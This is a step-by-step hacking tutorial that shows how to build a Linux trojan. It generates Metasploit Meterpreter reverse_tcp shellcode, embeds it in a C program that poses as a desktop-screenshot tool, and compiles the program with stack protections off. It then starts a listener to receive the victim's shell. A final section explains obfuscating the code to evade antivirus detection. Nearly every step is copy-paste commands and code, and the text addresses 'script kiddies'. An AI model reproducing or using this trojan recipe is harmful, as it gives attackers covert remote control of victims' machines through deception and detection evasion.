#### SHELLCODE DESCRIPTION (Wikipedia)
In hacking, a shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability. It is called "shellcode" because it typically starts a command shell from which the attacker can control the compromised machine, but any piece of code that performs a similar task can be called shellcode. Because the function of a payload is not limited to merely spawning a shell, some have suggested that the name shellcode is insufficient. However, attempts at replacing the term have not gained wide acceptance. Shellcode is commonly written in machine code. 

---

<br />

#### EXERCISE DESCRIPTION
This exercise describes how to use metasploit framework to generate shellcode in C format and redirect the stdout to a text file (chars.raw).
That text file later will be used to parse the raw shellcode data into oneliner string thats going to be injected into one C Program that we also need to build to be abble to execute shellcode in target ram (running in background). This exercise also describes the use of ['MITRE ATT&CK T1113'](https://attack.mitre.org/techniques/T1113/) as social engineering technic to trick the remote user into executing our program with the promiss of taking a screenshot to current desktop and display it. As final stage we will need to use the ['GCC'](https://www.cyberciti.biz/faq/debian-linux-install-gnu-gcc-compiler/) compiler to be abble to complie our C Program into one Linux executable before send it to target user.

    Attacker  : Linux Kali x86 bits
    Target    : Linux (all distros) x86 bits
    Payload   : linux/x86/meterpreter/reverse_tcp
    shellcode : C format
    executable: C Program
    Social Eng: MITRE ATT&CK T1113

<br />

#### SOCIAL ENGINEERING ['wiki'](https://en.wikipedia.org/wiki/Social_engineering_(security))
Social engineering is the art of manipulating users of a computing system into revealing confidential information or into executing malicious code. In this exercise we will explore human curiosity to gain remote code execution (RCE) in remote system using the C program as a **RAT** working in background while the rest of the C program performs the function of social engineering taking a screenshot of user desktop and displaying it as promiss, without him realizing that our shellcode its also running in background giving us remote access to is machine. (tipical trojan behavior)


<br />

#### MULTI-THREAD (display screenshot + execute shellcode)
In this exercise its achieved using the bash **'&'** operator that backgrounds the current system() call of displaying the screenshot to target user while jumping into the next C function (execute shellcode in RAM). I add to use this trick because the system() call works like the **'&&'** operator (bash) that waits for the process to end before jumping into the next instruction. without the use of **'&'** operator the C program needed to wait for user to close the screenshot befor executing the shellcode into ram, so we will have 2 process working in background (display screenshot and execute shellcode) without waiting for user intervention in the proccess.

<br />

#### STEPS REQUIRED TO ACHIEVE THIS
[1º Use Metasploit to Build Shellcode in C Format](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#3%C2%BA-use-metasploit-to-build-shellcode-in-c-format)<br />
[2º Insert the C shellcode created into our C program](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#5%C2%BA-insert-the-c-shellcode-created-into-our-c-program)<br />
[3º Use GCC to compile the C program (make it executable)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#6%C2%BA-use-gcc-to-compile-our-c-program-make-it-executable)<br />


<br />

#### LIST OF DEPENDENCIES NEEDED

| DEPENDENCIE | DESCRIPTION | FUNCTION | REQUIRED |
|---|---|---|---|
| Metasploit | Metasploit Framework | Build Shellcode + Recive Connection ( handler )| yes |
| [GCC](https://www.cyberciti.biz/faq/debian-linux-install-gnu-gcc-compiler/) | C Compiler | Compile the C Program ( make it executable ) | yes |
| [xwd](http://blog.tordeu.com/?p=135) | X Window Screenshots | Take Screenshots ( social engineering ) | optional |

**HINT:** 'xwd package its by default native installed under most linux distros (or maybee in all)'


<br /><br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#exercise-description)

---

### STEP-BY-STEP (HOW-TO)
Execute all commands that are inside the grey box(s) sequencialy using only your terminal (console prompt).<br />
This exercise its written to allow readers to copy/paste the all exercise without the need to call upon GUI softwares.<br />
'For those script kiddies that just want things executed fast without many talks or wasting time reading descriptions' :) <br />

<br /><br />

#### 1º Build shellcode folder

```
sudo mkdir shellcode
cd shellcode
```

![pic](http://i63.tinypic.com/2dl9pop.png)

<br />

#### 2º Start postgresql service

```
sudo service postgresql start
```

![pic](http://i63.tinypic.com/2eoikbo.png)

<br />

#### 3º Use Metasploit to Build Shellcode in C Format
WARNING: Replace LHOST value by your local ip address<br />
WARNING: If your attacking a x64 bit system, then change the arch from -a x86 to -a x64<br />

```
sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 -b '\x00' -a x86 --platform linux -f c -o chars.raw

```

![pic](http://i64.tinypic.com/muk5xu.png)

**'Msfvenom Syntax'**<br />
-p msfvenom payload name<br />
-b delete all null bites from shellcode **'\x00'**<br />
-a payload arch<br />
-f shellcode output format<br />
-o write output to file chars.raw<br />

<br />

#### Review whats written inside chars.raw (optional)

```
cat chars.raw
```

![pic](http://i64.tinypic.com/15efzfp.png)

<br />

#### 4º [Parse](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/bash/parsing_data_in_bash.md) shellcode data and store it into a local bash variable

```
pa=$(cat chars.raw | grep -v "=" | tr -d '";' | tr -d '\n' | tr -d ' ')
```

![pic](http://i67.tinypic.com/2ms094w.png)

The shellcode data its now stored inside a bash local variable named **$pa**. This variable its going to be called in the next exercise (the creation of the C program) to embebbed the shellcode into our C Program while we are creating it.<br />

<br />

#### 5º Insert the C shellcode created into our C program

```
echo "#include<stdio.h>" > payload.c
echo "#include<stdlib.h>" >> payload.c
echo "#include<string.h>" >> payload.c
echo "" >> payload.c
echo "unsigned char buf[] = \"$pa\";" >> payload.c
echo "" >> payload.c
echo "int main()" >> payload.c
echo "{" >> payload.c
echo "  printf(\"Please Wait, Taking Screenshot ..\n...\", strlen(buf));" >> payload.c
echo "  system(\"sleep 1; xwd -root -out /tmp/ScreenShot.xwd\");" >> payload.c
echo "  system(\"sleep 1; xwud -in /tmp/ScreenShot.xwd &\");" >> payload.c
echo "  void (*ret)() = (void(*)())buf;" >> payload.c
echo "  ret();" >> payload.c
echo "}" >> payload.c
```

![pic](http://i65.tinypic.com/25inlle.png)
WARNING: This C Program only works in Linux distros, but with a few modifications like the inclusion of **<windows.h>**<br />
lib and with a diferent [GCC](https://www.cyberciti.biz/faq/debian-linux-install-gnu-gcc-compiler/) compiler command syntax, it can be possible to pull out the same trick agains windows users.<br /> 

<br />

#### Review whats written inside payload.c (optional)

```
cat payload.c
```

![pic](http://i64.tinypic.com/x4eu6s.png)

<br />

#### 6º Use GCC to compile our C program (make it executable)

```
sudo gcc -fno-stack-protector -z execstack payload.c -o desktop_screenshot
```

![pic](http://i68.tinypic.com/15klg4.png)

<br />

#### 7º Start metasploit multi handler
WARNING: Replace LHOST value by your local ip address<br />
WARNING: If your attacking a x64 bit system, then change the arch from -a x86 to -a x64<br />

```
sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit'
```

![pic](http://i65.tinypic.com/30xc589.png)

<br />

#### 8º Execution of the C Program (in remote machine)

```
chmod +x desktop_screenshot
sudo ./desktop_screenshot
```

![pic](http://i66.tinypic.com/2a8g77r.png)

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#exercise-description)

---

<br />

#### EXTRA (Obfuscation)
'The follow chapter reffers to obfuscation technics that can be used to improve the above C Program'.<br />
Shellcode obfuscation can be used to evade **IDS/AV (static detection)** or make the sourcecode unreadable for users.<br />
The follow commented line in C (blue) show us how to use msfvenom RC4 crypter to build our shellcode stub.
![pic](http://i66.tinypic.com/vsozf4.png)

<br />

In the follow example we are using **memset** to De-Obfuscate the bash command only at runtime exec.
This meens that AV static analysis scanning for MITRE ATT&CK ID(s) can not find any command related to **xwd** package to flag as suspicious.
![pic](http://i68.tinypic.com/dnne4g.png)

     [OBFUSCATED]    : sleep 1;Owd -rift -put /tmp/Scr.x0d;xwOd -in /tmp/Scr.Owd &
     [DE-OBFUSCATED] : sleep 1;xwd -root -out /tmp/Scr.xwd;xwud -in /tmp/Scr.xwd &

**memset** will replace characters in **str[]** variable declaration based on there possition on the line.<br />
Then **system(str)** its called further ahed in sourcecode to execute the De-Obfuscated bash command at runtime.
![pic](http://i67.tinypic.com/14mx3du.png) 
More Information about C obfuscation technics can be found [here](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#c-obfuscation-technics-c-exe)

---

<br />

#### Video Tutorial

[C Shellcode Linux - Video Tutorial](https://youtu.be/Td0nGOisYGA)

<br />


#### Usefull links
[1] [rapid7-hiding-metasploit-shellcode-to-evade-windows-defender/](https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/)<br />
[2] [rapid7-whitepaper-metasploit-framework-encapsulating-av-techniques.pdf](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/rapid7-whitepaper-metasploit-framework-encapsulating-av-techniques.pdf)<br />
[3] [r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#c-obfuscation-technics-c-exe)<br />

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#exercise-description)

---

### Suspiciou Shell Activity - RedTeam @2019


